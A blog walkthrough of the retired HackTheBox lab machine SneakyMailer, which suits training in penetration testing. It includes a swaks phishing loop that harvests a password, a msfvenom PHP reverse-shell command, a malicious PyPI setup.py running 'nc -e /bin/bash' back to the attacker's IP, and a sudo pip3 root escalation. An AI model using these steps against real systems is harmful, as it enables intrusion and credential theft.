---
layout: walkthrough
title: HackTheBox - SneakyMailer
date: 2020-11-29 12:00:00 +0200
img: ChallengeVMs/HTB_Icons/sneakymailer.png # Add image post (optional)
status: Retired
description: Hi all, My name is Kyhle Öhlinger and this blog post forms part of my personal blog. If you enjoy any of the posts, feel free to reach out and let me know :) 
---

Hi everyone, today we are going to be looking at SneakyMailer --`10.10.10.197`-- from HackTheBox. The image below provides a high-level overview of the topics covered during this walkthrough:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/SneakyMailer/Overview.png"  style="width: 65%" />
</p>

## Information Gathering

In order to start the VM, we start with the Information gathering phase. Let's begin with a Rust Scan.

### Rust Output

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/SneakyMailer$ rustscan  sneakycorp.htb --ulimit 5000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
https://admin.tryhackme.com

[~] The config file is expected to be at "/home/vagrant/.config/rustscan/config.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.10.197:21
Open 10.10.10.197:22
Open 10.10.10.197:25
Open 10.10.10.197:80
Open 10.10.10.197:143
Open 10.10.10.197:993
Open 10.10.10.197:8080
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 21,22,25,80,143,993,8080 10.10.10.197

Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-16 15:42 EDT
Initiating Ping Scan at 15:42
Scanning 10.10.10.197 [2 ports]
Completed Ping Scan at 15:42, 0.20s elapsed (1 total hosts)
Initiating Connect Scan at 15:42
Scanning sneakycorp.htb (10.10.10.197) [7 ports]
Discovered open port 80/tcp on 10.10.10.197
Discovered open port 25/tcp on 10.10.10.197
Discovered open port 993/tcp on 10.10.10.197
Discovered open port 22/tcp on 10.10.10.197
Discovered open port 8080/tcp on 10.10.10.197
Discovered open port 21/tcp on 10.10.10.197
Discovered open port 143/tcp on 10.10.10.197
Completed Connect Scan at 15:42, 0.20s elapsed (7 total ports)
Nmap scan report for sneakycorp.htb (10.10.10.197)
Host is up, received syn-ack (0.20s latency).
Scanned at 2020-09-16 15:42:56 EDT for 1s

PORT     STATE SERVICE    REASON
21/tcp   open  ftp        syn-ack
22/tcp   open  ssh        syn-ack
25/tcp   open  smtp       syn-ack
80/tcp   open  http       syn-ack
143/tcp  open  imap       syn-ack
993/tcp  open  imaps      syn-ack
8080/tcp open  http-proxy syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds

```

</details>

### Nmap Output

From there, I decided to do an additional Nmap scan to gather additional information about the open ports. The output of which is provided below:

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/SneakyMailer$ sudo nmap -sC -sV 10.10.10.197 -p21,22,25,80,143,993
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-14 04:21 EDT
Nmap scan report for 10.10.10.197
Host is up (0.20s latency).

PORT    STATE SERVICE    VERSION
21/tcp  open  ftp        vsftpd 3.0.3
22/tcp  open  tcpwrapped
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
25/tcp  open  smtp       Postfix smtpd
|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
80/tcp  open  http       nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://sneakycorp.htb
143/tcp open  imap       Courier Imapd (released 2018)
|_imap-capabilities: ENABLE SORT THREAD=REFERENCES ACL2=UNION CHILDREN UIDPLUS IDLE IMAP4rev1 OK completed STARTTLS QUOTA NAMESPACE ACL THREAD=ORDEREDSUBJECT CAPABILITY UTF8=ACCEPTA0001
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
993/tcp open  ssl/imap   Courier Imapd (released 2018)
|_imap-capabilities: ENABLE SORT THREAD=REFERENCES AUTH=PLAIN ACL2=UNION CHILDREN UIDPLUS IDLE IMAP4rev1 OK completed UTF8=ACCEPTA0001 QUOTA ACL THREAD=ORDEREDSUBJECT NAMESPACE CAPABILITY
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
Service Info: Host:  debian; OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.81 seconds

```

</details>

From the output shown above, we can see that the machine is a Linux machine, and I added `sneakycorp.htb` to the `/etc/hosts` file based on the redirect information from the nmap scan above.  There were a lot of open ports on the machine, so I decided to start by looking at the web application. When browsing to <http://sneakycorp.htb> we were presented with the following web page:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/SneakyMailer/img1.png"  style="width: 100%" />
</p>

### Basic Web Enumeration

As shown in the image above, I was already authenticated to the application so I could start browsing immediately. After poking around the application for a little while, I came across the team members page: <http://sneakycorp.htb/team.php#>. This provided us with a table for all members within the organisation, an extract is shown below:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/SneakyMailer/img2.png"  style="width: 100%" />
</p>

Using the table above, I created a user list from this table through the use of a curl command which effectively strips the table and outputs the content for a given web page. That command is shown below:

```bat
curl "http://sneakycorp.htb/team.php#" 2>/dev/null | grep -i -e '</\?TABLE\|</\?TD\|</\?TR\|</\?TH' | sed 's/^[\ \t]*//g' | tr -d '\n' | sed 's/<\/TR[^>]*>/\n/Ig'  | sed 's/<\/\?\(TABLE\|TR\)[^>]*>//Ig' | sed 's/^<T[DH][^>]*>\|<\/\?T[DH][^>]*>$//Ig' | sed 's/<\/T[DH][^>]*><T[DH][^>]*>/,/Ig' > user_list.lst

```

Using the command above, I effectively generated a user list with the username, role, and email address for each account within the application. An excerpt of the output is shown below:

<details>

```
<-- SNIPPING
Jennifer Acosta,Junior Javascript Developer,Edinburgh,jenniferacosta@sneakymailer.htb
Cara Stevens,Sales Assistant,New York,carastevens@sneakymailer.htb
Hermione Butler,Regional Director,London,hermionebutler@sneakymailer.htb
Lael Greer,Systems Administrator,London,laelgreer@sneakymailer.htb
Jonas Alexander,Developer,San Francisco,jonasalexander@sneakymailer.htb
Shad Decker,Regional Director,Edinburgh,shaddecker@sneakymailer.htb

SNIPPING -->
```

</details>

### Subdomain scraping 

While I was looking into the web application, I also ran `ffuf` to ensure that I wasn't missing anything while doing manual verification. The subdomain enumeration came in handy as I discovered an additional subdomain as shown below:

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/SneakyMailer$ ffuf -c -u http://sneakycorp.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.sneakycorp.htb" -fs 185

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://sneakycorp.htb/
 :: Header           : Host: FUZZ.sneakycorp.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: 185
________________________________________________

dev                     [Status: 200, Size: 13737, Words: 4007, Lines: 341]
:: Progress: [4997/4997] :: Job [1/1] :: 185 req/sec :: Duration: [0:00:27] :: Errors: 0 ::

```

</details>

Success! After adding `dev.sneakycorp.com` to `/etc/hosts`, we were able to browse to the web application which was very similar to the initial web page. The new page didn't really provide us with anything different for now, so I decided to continue searching through the other ports. 

### Port 8080

Once I was happy that I managed to extract everything from the web application on port 80, I decided to look into the other ports. Starting off with port 8080, I was presented with the following:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/SneakyMailer/img3.png"  style="width: 100%" />
</p>


This appeared to be a default nginx welcome page so I didn't spend too much time on it.


## SMTP Enumeration

Since this machine was called SneakyMailer, I assumed that it had something to do with emails or phishing. I used the wordlist that we initially built up and extracted all of the email addresses. To ensure that the email addresses were valid, I ran them through metasploit's `smtp_enum` module, the output of which is shown below:

<details>

```bat
msf5 > use auxiliary/scanner/smtp/smtp_enum
msf5 auxiliary(scanner/smtp/smtp_enum) > options

Module options (auxiliary/scanner/smtp/smtp_enum):

   Name       Current Setting                                                Required  Description
   ----       ---------------                                                --------  -----------
   RHOSTS                                                                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      25                                                             yes       The target port (TCP)
   THREADS    1                                                              yes       The number of concurrent threads (max one per host)
   UNIXONLY   true                                                           yes       Skip Microsoft bannered servers when testing unix users
   USER_FILE  /usr/share/metasploit-framework/data/wordlists/unix_users.txt  yes       The file that contains a list of probable users accounts.

msf5 auxiliary(scanner/smtp/smtp_enum) > set RHOSTS 10.10.10.197
RHOSTS => 10.10.10.197
msf5 auxiliary(scanner/smtp/smtp_enum) > set USER_FILE /home/vagrant/Desktop/HackTheBox/SneakyMailer/email_list.ls
t
USER_FILE => /home/vagrant/Desktop/HackTheBox/SneakyMailer/email_list.lst
msf5 auxiliary(scanner/smtp/smtp_enum) > run

[*] 10.10.10.197:25       - 10.10.10.197:25 Banner: 220 debian ESMTP Postfix (Debian/GNU)
[+] 10.10.10.197:25       - 10.10.10.197:25 Users found: airisatou@sneakymailer.htb, angelicaramos@sneakymailer.htb, ashtoncox@sneakymailer.htb, bradleygreer@sneakymailer.htb, brendenwagner@sneakymailer.htb, briellewilliamson@sneakymailer.htb, brunonash@sneakymailer.htb, caesarvance@sneakymailer.htb, carastevens@sneakymailer.htb, cedrickelly@sneakymailer.htb, chardemarshall@sneakymailer.htb, colleenhurst@sneakymailer.htb, dairios@sneakymailer.htb, donnasnider@sneakymailer.htb, doriswilder@sneakymailer.htb, finncamacho@sneakymailer.htb, fionagreen@sneakymailer.htb, garrettwinters@sneakymailer.htb, gavincortez@sneakymailer.htb, gavinjoyce@sneakymailer.htb, glorialittle@sneakymailer.htb, haleykennedy@sneakymailer.htb, hermionebutler@sneakymailer.htb, herrodchandler@sneakymailer.htb, hopefuentes@sneakymailer.htb, howardhatfield@sneakymailer.htb, jacksonbradshaw@sneakymailer.htb, jenagaines@sneakymailer.htb, jenettecaldwell@sneakymailer.htb, jenniferacosta@sneakymailer.htb, jenniferchang@sneakymailer.htb, jonasalexander@sneakymailer.htb, laelgreer@sneakymailer.htb, martenamccray@sneakymailer.htb, michaelsilva@sneakymailer.htb, michellehouse@sneakymailer.htb, olivialiang@sneakymailer.htb, paulbyrd@sneakymailer.htb, prescottbartlett@sneakymailer.htb, quinnflynn@sneakymailer.htb, rhonadavidson@sneakymailer.htb, sakurayamamoto@sneakymailer.htb, sergebaldwin@sneakymailer.htb, shaddecker@sneakymailer.htb, shouitou@sneakymailer.htb, sonyafrost@sneakymailer.htb, sukiburks@sneakymailer.htb, sulcud@sneakymailer.htb, tatyanafitzpatrick@sneakymailer.htb, thorwalton@sneakymailer.htb, tigernixon@sneakymailer.htb, timothymooney@sneakymailer.htb, unitybutler@sneakymailer.htb, vivianharrell@sneakymailer.htb, yuriberry@sneakymailer.htb, zenaidafrank@sneakymailer.htb, zoritaserrano@sneakymailer.htb
[*] 10.10.10.197:25       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed


airisatou@sneakymailer.htb, angelicaramos@sneakymailer.htb, ashtoncox@sneakymailer.htb, bradleygreer@sneakymailer.htb, brendenwagner@sneakymailer.htb, briellewilliamson@sneakymailer.htb, brunonash@sneakymailer.htb, caesarvance@sneakymailer.htb, carastevens@sneakymailer.htb, cedrickelly@sneakymailer.htb, chardemarshall@sneakymailer.htb, colleenhurst@sneakymailer.htb, dairios@sneakymailer.htb, donnasnider@sneakymailer.htb, doriswilder@sneakymailer.htb, finncamacho@sneakymailer.htb, fionagreen@sneakymailer.htb, garrettwinters@sneakymailer.htb, gavincortez@sneakymailer.htb, gavinjoyce@sneakymailer.htb, glorialittle@sneakymailer.htb, haleykennedy@sneakymailer.htb, hermionebutler@sneakymailer.htb, herrodchandler@sneakymailer.htb, hopefuentes@sneakymailer.htb, howardhatfield@sneakymailer.htb, jacksonbradshaw@sneakymailer.htb, jenagaines@sneakymailer.htb, jenettecaldwell@sneakymailer.htb, jenniferacosta@sneakymailer.htb, jenniferchang@sneakymailer.htb, jonasalexander@sneakymailer.htb, laelgreer@sneakymailer.htb, martenamccray@sneakymailer.htb, michaelsilva@sneakymailer.htb, michellehouse@sneakymailer.htb, olivialiang@sneakymailer.htb, paulbyrd@sneakymailer.htb, prescottbartlett@sneakymailer.htb, quinnflynn@sneakymailer.htb, rhonadavidson@sneakymailer.htb, sakurayamamoto@sneakymailer.htb, sergebaldwin@sneakymailer.htb, shaddecker@sneakymailer.htb, shouitou@sneakymailer.htb, sonyafrost@sneakymailer.htb, sukiburks@sneakymailer.htb, sulcud@sneakymailer.htb, tatyanafitzpatrick@sneakymailer.htb, thorwalton@sneakymailer.htb, tigernixon@sneakymailer.htb, timothymooney@sneakymailer.htb, unitybutler@sneakymailer.htb, vivianharrell@sneakymailer.htb, yuriberry@sneakymailer.htb, zenaidafrank@sneakymailer.htb, zoritaserrano@sneakymailer.htb

```

</details>

From there, I took the email list above, ran it through sed and ensured that all emails were on a single line using the following command:

```bat
sed 's/,/\n/g' msf_list.lst > msf.lst
```

### Phishing Attack using Swaks

Swaks is a featureful, flexible, scriptable, transaction-oriented SMTP test tool which can be found at the following URL: <https://jetmore.org/john/code/swaks/>. In order to make use of this tool, I went on the assumption that it would need to return data to you so I needed to ensure that whatever email I sent to the machine, I was able to receive data. 

During the initial exploit, I inserted the IP address of my host in both the Subject and Body fields since I didn't know which parameter the host would look at. From there I iterated through each email address identified above and sent an email to them using the following command:

```bat
while read email_list; do swaks -to  $email_list -from root -header "Subject: http://10.10.14.115" –body "http://10.10.14.115" -server 10.10.10.197; done < msf.lst
```

While looping through the email addresses, I ran a netcat server on my local machine to determine if any connection would be returned from the phishing email above. You could also make use of the `-k` flag to keep the connection open, however for this exploit we did not need the flag. After waiting for a few seconds, a netcat session was returned to us including information for a user: `paul bard`, the output is shown below:

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/SneakyMailer$ sudo nc -nvlp 80
listening on [any] 80 ...
connect to [10.10.14.115] from (UNKNOWN) [10.10.10.197] 32800
POST / HTTP/1.1
Host: 10.10.14.115
User-Agent: python-requests/2.23.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 185
Content-Type: application/x-www-form-urlencoded

firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt

```
</details>

Using the information shown above, I placed the URL encoded block into CyberChef -- however burpsuite or any other URL decoder would have worked. If you would like to see the original query and information returned via CyberChef, the URL is as follows: 

```
http://icyberchef.com/#recipe=URL_Decode()&input=Zmlyc3ROYW1lPVBhdWwmbGFzdE5hbWU9QnlyZCZlbWFpbD1wYXVsYnlyZCU0MHNuZWFreW1haWxlci5odGImcGFzc3dvcmQ9JTVFJTI4JTIzSiU0MFNrRnYyJTVCJTI1S2hJeEtrJTI4SnUlNjBocWNIbCUzQyUzQUh0JnJwYXNzd29yZD0lNUUlMjglMjNKJTQwU2tGdjIlNUIlMjVLaEl4S2slMjhKdSU2MGhxY0hsJTNDJTNBSHQ
```

The decoded output is provided below:

```bat
firstName=Paul&lastName=Byrd&email=paulbyrd@sneakymailer.htb&password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht&rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
```

## Interacting with IMAP
Now that we have a username, password combination for a user, we can begin enumeration of the host. Since the web application did not have any login functionality and the credentials didn't work for FTP or SSH, I decided to look into the other open ports on the server, namely the IMAP ports. In order to interact with IMAP using authentication, you need to encode the credentials using Base64. In order to encode the credentials, I used the following commands:

```bat
vagrant@ko:~/Desktop/HackTheBox/SneakyMailer$ echo -n "paulbyrd" | base64
cGF1bGJ5cmQ=

vagrant@ko:~/Desktop/HackTheBox/SneakyMailer$ echo -n "^(#J@SkFv2[%KhIxKk(Ju\`hqcHl<:Ht" | base64
XigjSkBTa0Z2MlslS2hJeEtrKEp1YGhxY0hsPDpIdA==
```

When attempting to interact with this service, HackTricks has some fantastic information which can be found at the following URL: <https://book.hacktricks.xyz/pentesting/pentesting-imap>. I initially attempted to authenticate to port 25, however authentication was not enabled on this service:

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/SneakyMailer$ nc 10.10.10.197 25
AUTH LOGIN
220 debian ESMTP Postfix (Debian/GNU)
503 5.5.1 Error: authentication not enabled
```
</details>

If you recall from the initial Nmap scan, we also had access to port 993 which is IMAP over SSL. Looking back at the Nmap output, Port 993 allows Auth Plain which we can then hopefully authenticate to using the credentials for Paul. In order to authenticate to this protocol, I used the following openssl command:

```bat
openssl s_client -connect 10.10.10.197:993 -quiet

```

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/SneakyMailer/img4.png"  style="width: 75%" />
</p>

As shown above, authentication was successful and we received a `a1 OK LOGIN OK` response from the server. Now that we have authenticated to IMAP, we are able to interact with it like a normal mailbox. In order to retrieve the relevant data, I made use of the following commands:

* List Folders -- `A1 LIST "" *`
* Select a mailbox -- `A1 SELECT INBOX`
* Select a certain folder within the Inbox -- `A1 SELECT "INBOX.Sent Items"`
* Retrieve the first email within this folder -- `A1 FETCH 1 body[text]`
* Retrieve the second email within this folder -- `A1 FETCH 2 body[text]`

<details>

```text
A1 LIST "" *

A1 LIST "" *
* LIST (\Unmarked \HasChildren) "." "INBOX"
* LIST (\HasNoChildren) "." "INBOX.Trash"
* LIST (\HasNoChildren) "." "INBOX.Sent"
* LIST (\HasNoChildren) "." "INBOX.Deleted Items"
* LIST (\HasNoChildren) "." "INBOX.Sent Items"
A1 OK LIST completed
```

```text
A1 SELECT "INBOX.Sent Items"
* FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)
* OK [PERMANENTFLAGS (\* \Draft \Answered \Flagged \Deleted \Seen)] Limited
* 2 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 589480766] Ok
* OK [MYRIGHTS "acdilrsw"] ACL
A1 OK [READ-WRITE] Ok
```

```text
A1 FETCH 1 body[text]
* 1 FETCH (BODY[TEXT] {1888} 
Hello administrator, I want to change this password for the developer account

Username: developer
Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C

Please notify me when you do it.

)
A1 OK FETCH completed.
```

```text
A1 FETCH 2 body[text]
* 2 FETCH (BODY[TEXT] {166}
Hello low


Your current task is to install, test and then erase every python module you 
find in our PyPI service, let me know if you have any inconvenience.

)
A1 OK FETCH completed.
```

</details>


By enumerating the mailbox, we now had some additional information to go on. We managed to retrieve the username, password combination for the developer account: `developer:m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C`, and we also had the task assigned to the user:

> Your current task is to install, test and then erase every python module you find in our PyPI service, let me know if you have any inconvenience.

I initially attempted to authenticate with these credentials to the SSH instance which did not work, so I attempted FTP which was successful as shown below:

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/SneakyMailer$ ftp 10.10.10.197
Connected to 10.10.10.197.
220 (vsFTPd 3.0.3)
Name (10.10.10.197:vagrant): developer
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

</details>

### Access to FTP

Now that we had authenticated access to the FTP service, I decided to retrieve the contents of the directory in order to enumerate any potentially useful information from the server. In order to retrieve the contents of the FTP server, I made use of the following command:

```bat
wget -r --user="developer" --password="m^AsY7vTKVT+dV1{WOU%@NaHk
```

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/SneakyMailer/ftp$ wget -r --user="developer" --password="m^AsY7vTKVT+dV1{WOU%@NaHk
UAId3]C" ftp://10.10.10.197                                                                                       
--2020-09-17 11:14:30--  ftp://10.10.10.197/                                                                      
           => ‘10.10.10.197/.listing’                                                                             
Connecting to 10.10.10.197:21... connected.                                                                       
Logging in as developer ... Logged in!                                                                            
==> SYST ... done.    ==> PWD ... done.                                                                           
==> TYPE I ... done.  ==> CWD not needed.                                                                         
==> PASV ... done.    ==> LIST ... done.                                                                          
                                                                                                                  
10.10.10.197/.listing            [ <=>                                         ]     180  --.-KB/s    in 0s       
                                                                                                                  
2020-09-17 11:14:33 (5.23 MB/s) - ‘10.10.10.197/.listing’ saved [180]       

< -- SNIPPING -- >

--2020-09-17 11:19:29--  ftp://10.10.10.197/dev/vendor/jquery-easing/jquery.easing.min.js
           => ‘10.10.10.197/dev/vendor/jquery-easing/jquery.easing.min.js’
==> CWD not required.
==> PASV ... done.    ==> RETR jquery.easing.min.js ... done.
Length: 2532 (2.5K)

10.10.10.197/dev/vendor/jque 100%[============================================>]   2.47K  --.-KB/s    in 0.001s  

2020-09-17 11:19:30 (3.03 MB/s) - ‘10.10.10.197/dev/vendor/jquery-easing/jquery.easing.min.js’ saved [2532]

FINISHED --2020-09-17 11:19:30--
Total wall clock time: 4m 59s
Downloaded: 193 files, 15M in 1m 42s (153 KB/s)
```

</details>


After retrieving the contents of the folder, I didn't find anything particularly useful, so instead I decided to try and upload a PHP reverse shell. I initially tried to make use of the basic web shell, however I never managed to get it working since there was a cron job deleting any additional files from the server. Instead, I created a php reverse shell using the following commands from [Netsec](https://netsec.ws/?p=331): 

```bat
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

```

Once I had my payload generated, I uploaded the file to the FTP server using the `PUT` command as shown below:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/SneakyMailer/img6.png"  style="width: 75%" />
</p>


Browsing to the dev instance of the web application (since the FTP folder was named dev), I navigated to my reverse shell and managed to get a connection back to my machine:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/SneakyMailer/img7.png"  style="width: 75%" />
</p>


## Low Privilege Access as www-data

If you recall, this machine mentioned a pypi installation. Navigating to `pypi.sneakycorp.htb`, we saw that there was a `.htpasswd` file as shown below:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/SneakyMailer/img8.png"  style="width: 75%" />
</p>

Awesome! We now had an additional set of credentials for the pypi user: `pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/`. Putting the hash through HashID, we can see that it's most likely a MD5 hash:

```bat
vagrant@ko:~/Desktop/HackTheBox/SneakyMailer$ hashid 
$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
Analyzing '$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/'
[+] MD5(APR) 
[+] Apache MD5

```

Now that we know it's a valid hash, I decided to run it through John the Ripper which managed to crack the password for the user as shown below:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/SneakyMailer/img9.png"  style="width: 75%" />
</p>

Even though I now had the credentials for the Pypi user, I was unable to log in to the account since the account had the `/usr/sbin/nologin` field set within `/etc/passwd`. 

## Lateral Movement to the Developer User

Looking at the users within `/etc/passwd`, we can see that there are two user accounts with login capabilities, namely; low and developer. We already had the password for the developer user, so I used the `su developer` command with the password, and I successfully moved to that user. 

### Abusing Pypi

If you recall from the second email, `low` had a task assigned to them:

> Hello low
>
> Your current task is to install, test and then erase every python module you find in our PyPI service, let me know if you have any inconvenience.

After some initial enumeration using the developer user, I assumed that privilege escalation revolved around this aspect of the machine. I added `pypi.sneakycorp.htb` to the `/etc/hosts` file. Port 80 redirected to `sneakycorp.htb` but port 8080 provided me with the following:


<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/SneakyMailer/img10.png"  style="width: 100%" />
</p>


Okay -- now that we have access to the pypi server, as well as credentials for the pypi user, we need to try and create a malicious pypi package. When creating out package, we can ensure that it uses the correct credentials through the [authentication section](https://pypi.org/project/pypiserver/#apache-like-authentication-htpasswd) within the `.pypirc` file. Okay lets try this -- I created a `.pypirc` file in `/tmp/hotshoto`:

<details>

```yml
[distutils]
index-servers =
  pypi
  mypackage

[pypi]
username:pypi
password:soufianeelhaoui

[mypackage]
repository: http://pypi.sneakycorp.htb:8080
username: pypi
password: soufianeelhaoui

```

</details>

After creating that file, I had a way to authenticate as the pypi user but I didn't have it pointing to any of the index-servers, so I needed to create `mypackage`. Since I've never done this before, I spent a lot of time googling how to create python-packages for pypi. <https://packaging.python.org/specifications/pypirc/> mentions private-repositories so I went looking for how to create those and the first link was by linode: <https://www.linode.com/docs/applications/project-management/how-to-create-a-private-python-package-repository/>. In the article, they mention how to create package files and the typical structure that it should follow, which is shown below:

```text
.
├── linode_example/
│   └── linode_example/
|       └── __init__.py
|   └── setup.py
│   ├── setup.cfg
|   └── README.md

```


Now that I knew the structure, I needed to create the relevant files. The contents of each of the files is shown below:

<details>

`__init__.py`:

```python
print("hello world")
```


`setup.py`:
```python
from setuptools import setup
import os

if os.getuid() == 1000:
    os.system('nc -e /bin/bash 10.10.14.115 1234')


setup(
    name='mypackage',
    packages=['mypackage'],
    description='Testing Pypi pwnage',
    version='0.1',
    url='http://pypi.sneakycorp.htb:8080/packages/',
    author='Hotshoto',
    author_email='hotshoto@htb.com',
    keywords=['pip','mypackage','pypi']
    )
```

`.pypirc`:

```yml
[distutils]
index-servers =
  pypi
  mypackage

[pypi]
username:pypi
password:soufianeelhaoui

[mypackage]
repository: http://pypi.sneakycorp.htb:8080
username: pypi
password: soufianeelhaoui
```

</details>

I have just included the final packages that I used to create the malicious pypi package above, it took me quite a while to figure out that we needed to wait for the low user to access the package, and in order to ensure that only that user can interact with it and not spawn shells from the `www-data` user, we needed to add in a check for the user's GUID. Once those files were created and uploaded to the host, we needed to register it as a package -- to do this we need a functioning python environment, luckily we can use the environment within pypi.sneakycorp.htb with the following command:

```bat
source /var/www/pypi.sneakycorp.htb/venv/bin/activate
```

In order to ensure that it makes use of the package that we created, we need to set the HOME variable to our malicious location. This can be accomplished through the use of the following command:

```bat
export HOME=/tmp/mypackage
```

Once we have set the new HOME environment, we can confirm that it is set correctly using `env`:

<details>

```bat
(venv) www-data@sneakymailer:~$ env
PWD=/tmp/mypackage
HOME=/tmp/mypackage
VIRTUAL_ENV=/var/www/pypi.sneakycorp.htb/venv
USER=www-data
SHLVL=1
PS1=(venv) ${debian_chroot:+($debian_chroot)}\u@\h:\w\$ 
PATH=/var/www/pypi.sneakycorp.htb/venv/bin:/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:.
OLDPWD=/tmp/mypackage/mypackage
_=/usr/bin/env
```

</details>

In order to upload the new package, we can use setup.py within the pypi folder:

```python
python setup.py sdist -r upload mypackage
```

The output of the above command is provided in the screenshot below:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/SneakyMailer/img11.png"  style="width: 75%" />
</p>


With the new package uploaded to the pypi server, we can simply wait while having a netcat listener running on our host. The incoming connection from the `low` user is shown below: 

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/SneakyMailer/img12.png"  style="width: 75%" />
</p>

The reason we managed to get the reverse shell back as the low user is because `low` was running `venv` on the `install-modules` package, which could be identified through the use of `ps -ef | grep low`. This command allows you to view running processes for a given user. 

## Privilege Escalation using the Low user

Now that we had access to `low`, I began the initial enumeration phase again. The use of the `sudo -L` command provided us with the following:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/SneakyMailer/img13.png"  style="width: 75%" />
</p>

As shown above, the user was able to run the sudo command on `/usr/bin/pip3` without the requirement for a password! In order to exploit this and return a root shell, I looked at [GTFO Bins](https://gtfobins.github.io/gtfobins/pip/) which had a very simple exploit as shown below:

<details>

```bat
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
```

</details>


After creating the file, I was able to run `sudo /usr/bin/pip3 install $TF` and return a root shell as shown below:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/SneakyMailer/img14.png"  style="width: 75%" />
</p>



That's the box! I hope that the walkthrough helped someone. If you found it interesting at all or if you think it was missing some crucial information, please reach out to me so that I can continue improving as I create more posts.